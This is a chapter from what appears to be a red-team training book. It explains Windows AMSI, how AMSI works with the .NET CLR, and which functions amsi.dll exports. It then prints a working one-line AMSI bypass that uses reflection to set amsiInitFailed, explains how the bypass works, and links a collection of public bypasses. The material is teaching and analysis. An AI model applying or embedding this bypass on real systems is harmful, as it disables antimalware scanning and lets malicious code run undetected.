<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>AMSI &amp; CLR - </title>
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "light" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div id="sidebar-scrollbox" class="sidebar-scrollbox">
                <ol class="chapter"><li class="expanded "><a href="training.html"><strong aria-hidden="true">1.</strong> Training </a></li><li><ol class="section"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.1.</strong> Intro</a></li><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.2.</strong> Havoc C2</a></li><li class="expanded "><a href="privesc.html"><strong aria-hidden="true">1.3.</strong> Privilege Escalation</a></li><li><ol class="section"><li class="expanded "><a href="unquoted.html"><strong aria-hidden="true">1.3.1.</strong> Unquoted Service Path</a></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">1.3.2.</strong> UAC</a></li><li class="expanded "><a href="stealtoken.html"><strong aria-hidden="true">1.3.3.</strong> Steal Token</a></li></ol></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.4.</strong> Windows Defender</a></li><li class="expanded "><a href="amsi.html" class="active"><strong aria-hidden="true">1.5.</strong> AMSI &amp; CLR</a></li><li><ol class="section"><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.5.1.</strong> ETW</a></li><li class="expanded "><a href="lab_powershell.html"><strong aria-hidden="true">1.5.2.</strong> Lab - Powershell</a></li></ol></li><li class="expanded "><a href="static.html"><strong aria-hidden="true">1.6.</strong> Static Analysis</a></li><li><ol class="section"><li class="expanded "><a href="lab_static.html"><strong aria-hidden="true">1.6.1.</strong> Lab Static Analysis</a></li><li class="expanded "><a href="lab_havoc_dotnet.html"><strong aria-hidden="true">1.6.2.</strong> Lab - Havoc dotnet execute</a></li></ol></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">1.7.</strong> Metasploit Basics</a></li><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.8.</strong> WIN32api and Functions</a></li><li class="expanded "><a href="shellcode.html"><strong aria-hidden="true">1.9.</strong> Shellcode</a></li><li><ol class="section"><li class="expanded "><a href="lab_shellcode.html"><strong aria-hidden="true">1.9.1.</strong> Lab - Shellcode</a></li><li class="expanded "><a href="lab_basic.html"><strong aria-hidden="true">1.9.2.</strong> Lab - Basic Loader</a></li><li class="expanded "><a href="lab_staged.html"><strong aria-hidden="true">1.9.3.</strong> Lab - Remote Loader</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.10.</strong> Evasion</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.10.1.</strong> Forensics - Litterbox</a></li></ol></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">2.</strong> Chapter Extra </a></li><li><ol class="section"><li class="expanded "><a href="heuristics.html"><strong aria-hidden="true">2.1.</strong> Heuristics</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">2.2.</strong> Hooks</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">2.3.</strong> Syscalls</a></li><li class="expanded "><a href="kernelcallbacks.html"><strong aria-hidden="true">2.4.</strong> Kernel Callbacks</a></li><li class="expanded "><a href="edr.html"><strong aria-hidden="true">2.5.</strong> EDR Stuff</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar" class="menu-bar">
                    <div id="menu-bar-sticky-container">
                        <div class="left-buttons">
                            <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                                <i class="fa fa-bars"></i>
                            </button>
                            <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                                <i class="fa fa-paint-brush"></i>
                            </button>
                            <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                                <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                            </ul>
                            
                            <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                                <i class="fa fa-search"></i>
                            </button>
                            
                        </div>

                        <h1 class="menu-title"></h1>

                        <div class="right-buttons">
                            <a href="print.html" title="Print this book" aria-label="Print this book">
                                <i id="print-button" class="fa fa-print"></i>
                            </a>
                            
                        </div>
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1><a class="header" href="#amsi-anti-malware-scanning-interface" id="amsi-anti-malware-scanning-interface">AMSI (Anti-Malware Scanning Interface)</a></h1>
<blockquote>
<p>WARNING : Amsi.dll is loaded into every powershell.exe process, but when running dotnet (csharp) binaries, amsi integrates directly with the clr which loads AMSI on demand. Amsi Bypasses that work in powershell don't necessariy work for the CLR integration.</p>
</blockquote>
<p>AmsiScanBuffer
AmsiScanString
AssemblyLoad</p>
<p>Show api calls made (user to kernel/syscall)</p>
<p>Languages</p>
<hr />
<ul>
<li>powershell (scripting)</li>
<li>vb.net (scripting)</li>
<li>c# (compiled)</li>
<li>f# (compiled)</li>
</ul>
<p><img src="./images/dotnet.jpeg" alt="dotnet" /></p>
<p>Here's a simplified diagram:</p>
<p><img src="./images/amsi_clr.jpg" alt="dotnet" /></p>
<p>AMSI</p>
<hr />
<p>Introduced in June 2015.</p>
<p>The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.</p>
<p>AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware products that can be integrated into applications. It supports a calling structure allowing for file and memory or stream scanning, content source URL/IP reputation checks, and other techniques.</p>
<p>The AMSI feature is integrated into these components of <code>Windows 10</code>:</p>
<ul>
<li>User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)</li>
<li>PowerShell <code>v5</code> (scripts, interactive use, and dynamic code evaluation)</li>
<li>Windows Script Host (Wscript.exe and Cscript.exe) (scripts and dynamic </li>
<li>Office365 (JavaScript/VBA)</li>
<li>Windows Management Instrumentation (WMI)</li>
<li>.Net Framework 4.8 (Scanning for all assemblies) - <em><strong>NEW</strong></em></li>
</ul>
<blockquote>
<p><strong>Runtime – Antimalware Scanning for All Assemblies</strong> : In previous versions of .NET Framework, Windows Defender or third-party antimalware software would automatically scan all assemblies loaded from disk for malware. However, assemblies loaded from elsewhere, such as by using Assembly.Load(byte[]), would not be scanned and could potentially carry viruses undetected.</p>
</blockquote>
<p><a href="https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/">https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/</a></p>
<p>.NET Framework 4.8 on Windows 10 triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.</p>
<p>In its default configuration, macros are scanned at runtime via AMSI except in the following scenarios:</p>
<ul>
<li>Documents opened while macro security settings are set to “Enable All Macros”</li>
<li>Documents opened from trusted locations</li>
<li>Documents that are trusted documents</li>
<li>Documents that contain VBA that is digitally signed by a trusted publisher</li>
</ul>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps">https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps</a></p>
<blockquote>
<p>Runtime – Antimalware Scanning for All Assemblies
In previous versions of .NET Framework, Windows Defender or third-party antimalware software would automatically scan all assemblies loaded from disk for malware. However, assemblies loaded from elsewhere, such as by using Assembly.Load(byte[]), would not be scanned and could potentially carry viruses undetected.</p>
<p>.NET Framework 4.8 (released April 18th on Windows 10) triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.</p>
<p><strong>LINK</strong> : <a href="https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/">https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/</a></p>
<p><strong>LINK</strong> : <a href="https://en.wikipedia.org/wiki/.NET_Framework_version_history">https://en.wikipedia.org/wiki/.NET_Framework_version_history</a></p>
</blockquote>
<p><img src="./images/amsi7archi.jpg" alt="image" /></p>
<h2><a class="header" href="#supported-os" id="supported-os">Supported OS</a></h2>
<ul>
<li>Windows 10 PRO/ENTERPRISE and Windows Server 2016 and later</li>
</ul>
<h2><a class="header" href="#supported-3rd-party-antivirusedr-vendors" id="supported-3rd-party-antivirusedr-vendors">Supported 3rd party Antivirus/EDR vendors</a></h2>
<ul>
<li>Windows Defender</li>
<li>Carbon Black Defense</li>
<li>Crowdstrike Falcon</li>
<li>Kaspersky</li>
<li>McAfee Endpoint Security 10.6.0 </li>
<li>Sophos</li>
<li>Symantec (v14.3 and later)</li>
<li>and a lot more...</li>
</ul>
<p><strong>LINK</strong> : <a href="https://github.com/subat0mik/whoamsi">https://github.com/subat0mik/whoamsi</a></p>
<p>To check which version of .net and the CLR is installed open a powershell prompt and type the following:</p>
<pre><code class="language-code">$psversiontable
[System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
$dotnet = [System.Reflection.Assembly]::Load(&quot;mscorlib&quot;)
$dotnet.GetName().Version
</code></pre>
<p><img src="./images/dotnetversion.jpg" alt="image" /></p>
<p>Let's see if our AMSI engine is working properly by doing a simple AMSI Test Sample (comparable to EICAR):</p>
<h2><a class="header" href="#amsitest" id="amsitest">AMSITEST</a></h2>
<pre><code class="language-yaml">Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
</code></pre>
<p><img src="./images/amsitest.jpg" alt="image" /></p>
<p>Even funnier, when you run the following command in a powershell console, AMSI will flag it as malicious, although the powershell script is not even available on your windows machine:</p>
<pre><code class="language-yaml">Invoke-Mimikatz
</code></pre>
<p><img src="./images/amsimimi.jpg" alt="image" /></p>
<blockquote>
<p><strong>Bypassing AMSI and how it works</strong></p>
</blockquote>
<p>As a first check, let's see in which process AMSI.dll has been loaded. Open a powershell prompt:</p>
<pre><code class="language-powershell">Get-Process | where {$_.modules.ModuleName -eq 'Amsi.dll'}
</code></pre>
<p><img src="./images/ps_amsips.jpg" alt="image" /></p>
<p>We can also use <code>SystemInformer</code> (previously known as <code>Process Hacker</code>) to verify, open <code>System Informer</code>, scroll down to your powershell process, right-click and select <code>properties</code>:</p>
<p><img src="./images/ps_si_ps.jpg" alt="image" /></p>
<p>Go to the <code>modules</code> tab, this will show all dll's loaded by the process, you will find the amsi.dll there indeed!</p>
<p><img src="./images/ps_si_amsi.jpg" alt="image" /></p>
<p>We're going to have a closer look at that AMSI.dll and see which functions it exports (more on functions later - just know that a windows program will load certain dll's from disk - these dll's contain common functions that Microsoft has made avaiable to make life a bit easier for developers :))</p>
<p><strong>Pre-requisites</strong>: dumpbin.exe /exports file.dll (requires visual studio c++ and msvc v142)</p>
<p><img src="./images/msvc142.jpg" alt="Screenshot" /></p>
<p><img src="./images/msvc_vs_dumpbin.jpg" alt="Screenshot" /></p>
<p>Open the &quot;Developer Command Prompt for Visual Studio 2019&quot;</p>
<p><img src="./images/ps_devprompt.jpg" alt="image" /></p>
<p>If we have a look at the amsi.dll's exported functions using dumpbin we see the forllowing functions are avaiable:</p>
<pre><code class="language-bash">dumpbin c:\windows\system32\amsi.dll /exports
</code></pre>
<pre><code class="language-bash">ordinal hint RVA      name

          1    0 00003860 AmsiCloseSession
          2    1 000034E0 AmsiInitialize
          3    2 00003800 AmsiOpenSession
 [+]      4    3 00003880 AmsiScanBuffer -&gt; scans the content of buffers
 [+]      5    4 00003980 AmsiScanString -&gt; scans the content of strings (variables)
          6    5 000039E0 AmsiUacInitialize
          7    6 00003C60 AmsiUacScan
          8    7 00003C00 AmsiUacUninitialize
          9    8 000037A0 AmsiUninitialize
         10    9 00001B00 DllCanUnloadNow
         11    A 00001B40 DllGetClassObject
         12    B 00001C80 DllRegisterServer
         13    C 00001C80 DllUnregisterServer
</code></pre>
<p>We can see here the AmsiScanBuffer and AmsiScanString functions we talked about earlier. So the question is, how to we bypass this functionality?</p>
<p>Luckily there are a ton of AMSI bypasses publicly available : (<a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a>)</p>
<p>In our next lab we'll be using &quot;Matt Graebers Reflection method&quot;, it's a simple one-liner which uses reflection to set the <code>amsiInitFailed</code> field to <code>$true</code>, and will also work in .NET binaries, not just in PowerShell. Let's have a look how it works before we implement it.</p>
<p><img src="./images/amsi_gitbypasses.jpg" alt="image" /></p>
<p><strong>&quot;Matt Graebers Reflection method&quot;</strong></p>
<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
</code></pre>
<h3><a class="header" href="#understanding-the-technique" id="understanding-the-technique">Understanding the Technique:</a></h3>
<p><strong>How it Works in <code>powershell</code>:</strong></p>
<ol>
<li><strong>Reflection:</strong> The core of this bypass relies on .NET reflection, which allows code to inspect and modify types, fields, and methods at runtime.</li>
<li><strong>Targeting <code>amsiInitFailed</code>:</strong> The code specifically targets the <code>amsiInitFailed</code> static field within the <code>System.Management.Automation.AmsiUtils</code> class. This field is used to indicate whether the AntiMalware Scan Interface (AMSI) initialization has failed.</li>
<li><strong>Setting to <code>$true</code>:</strong> By setting this field to <code>$true</code>, the code effectively tells the .NET runtime that AMSI initialization has failed, causing AMSI scans to be skipped.</li>
</ol>
<p><strong>How it Works in <code>.NET Binaries</code>:</strong></p>
<ol>
<li><strong>Locating <code>AmsiUtils</code>:</strong> Just like in PowerShell, you can use reflection in C# (or other .NET languages) to locate the <code>System.Management.Automation.AmsiUtils</code> class.</li>
<li><strong>Accessing <code>amsiInitFailed</code>:</strong> You can then use reflection to access the <code>amsiInitFailed</code> static field.</li>
<li><strong>Setting the Value:</strong> Finally, you can use reflection to set the value of the <code>amsiInitFailed</code> field to <code>true</code>.</li>
</ol>
<blockquote>
<p><strong>NOTE</strong>: Modern <code>EDR</code> solutions are designed to detect such reflection-based attacks. They often monitor for suspicious memory modifications and code behavior. <code>EDR</code>'s will hook functions and rely heavily on telemtry such as <code>ETW providers</code> (<em><strong>hint</strong></em> <em><strong>hint</strong></em>), of course these can also be bypassed. For now we focus on AV bypassing. </p>
</blockquote>
<p>In the next chapter we will briefly go over ETW and then we'll apply our knowledge on how to bypass <code>AMSI</code> and <code>ETW</code> in our next lab!</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        
                            <a rel="prev" href="defender.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                        

                        
                            <a rel="next" href="etw.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                
                    <a href="defender.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                

                
                    <a href="etw.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
                
            </nav>

        </div>

        
        <!-- Livereload script (if served using the cli tool) -->
        <script type="text/javascript">
            var socket = new WebSocket("ws://localhost:3001");
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload(true); // force reload from server (not from cache)
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>
        

        

        
        
        
        <script type="text/javascript">
            window.playpen_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        

    </body>
</html>
